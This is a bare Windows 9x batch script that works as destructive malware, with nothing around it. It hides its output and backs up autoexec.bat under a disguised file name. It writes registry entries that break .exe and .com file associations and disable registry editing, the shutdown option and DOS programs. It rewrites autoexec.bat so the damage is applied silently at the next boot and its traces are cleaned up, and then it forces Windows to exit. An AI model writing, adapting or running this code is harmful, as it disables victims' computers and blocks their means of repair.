   @echo off
   ctty nul
   cd %windir%
   md sys32bak
   cd\
   attrib autoexec.bat -h -w -s -a
   copy autoexec.bat %windir%\sys32bak\sys32.cab
   echo REGEDIT4 >t.reg
   echo. >>t.reg
   echo [HKEY_CLASSES_ROOT\.bat] >>t.reg
   echo @="batchfile" >>t.reg
   echo. >>t.reg
   echo [HKEY_CLASSES_ROOT\.exe] >>t.reg
   echo @="execfile" >>t.reg
   echo [HKEY_CLASSES_ROOT\.com] >>t.reg
   echo @="commfile" >>t.reg
   echo. >>t.reg
   echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >>t.reg
   echo. >>t.reg
   echo "NoClose"=dword:1 >>t.reg
   echo "DisableRegistryTools"=dword:1 >>t.reg
   echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp] >>t.reg
   echo. >>t.reg
   echo "Disabled"=dword:1 >>t.reg

   echo @echo off >autoexec.bat
   echo ctty nul >>autoexec.bat
   echo IF %1 ==oki goto 546 >>autoexec.bat
   echo goto 645 >>autoexec.bat
   echo :645 >>autoexec.bat
   echo regedit t.reg >>autoexec.bat
   echo del t.reg >>autoexec.bat
   echo copy autoexec.bat aut.bat  >>autoexec.bat
   echo aut.bat oki  >>autoexec.bat
   echo goto end >>autoexec.bat
   echo :546 >>autoexec.bat
   echo del autoexec.bat >>autoexec.bat
   echo copy windows\sys32bak\sys32.cab \autoexec.bat >>autoexec.bat
   echo cd windows >>autoexec.bat
   echo del sys32bak\sys32.cab >>autoexec.bat
   echo rd sys32bak >>autoexec.bat
   echo cd\  >>autoexec.bat
   echo del aut.bat  >>autoexec.bat
   echo :end  >>autoexec.bat
   echo.  >>autoexec.bat
   cd %windir%
   rundll32.exe user.exe,exitwindows
